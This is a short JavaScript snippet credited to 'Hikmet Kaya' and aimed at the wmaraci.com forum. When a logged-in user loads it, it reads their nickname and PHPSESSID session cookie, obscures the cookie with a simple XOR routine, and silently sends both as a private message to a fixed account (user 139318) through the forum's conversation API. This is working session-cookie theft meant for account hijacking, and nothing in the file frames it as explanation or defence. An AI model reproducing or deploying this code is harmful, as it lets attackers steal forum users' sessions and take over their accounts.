// CODED BY Hikmet Kaya

(() => {
  
  function getCook(cookiename){
    var cookiestring=RegExp(cookiename+"=[^;]+").exec(document.cookie); return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./,"") : "");
  }
  
  const crypt = (text) => {
    var salt = "hikmet"
    const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
    const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);

    return text
      .split("")
      .map(textToChars)
      .map(applySaltToChar)
      .map(byteHex)
      .join("");
  };

  const decrypt = (encoded) => {
    var salt = "hikmet"
    const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
    const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
    return encoded
      .match(/.{1,2}/g)
      .map((hex) => parseInt(hex, 16))
      .map(applySaltToChar)
      .map((charCode) => String.fromCharCode(charCode))
      .join("");
  };
  
  const logined = document.querySelector('a[href="/pm"]')
  if(logined){
    const nick = document.querySelector('.logined').querySelector('strong').innerHTML
    const sess = getCook("PHPSESSID")
    fetch("https://wmaraci.com/api/conversation/addPost", {
      "referrer": "https://wmaraci.com/pm",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "{\"conversationId\":0,\"toUserid\":[\"139318\"],\"createdBy\":\"139318\",\"createdAt\":\"2022-09-12 13:10:21\",\"author\":\"hikmetkaya35\",\"message\":\""+nick + " " + crypt(sess) +"\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    }).then(async res=>{await res.json()});
  }
  
})()
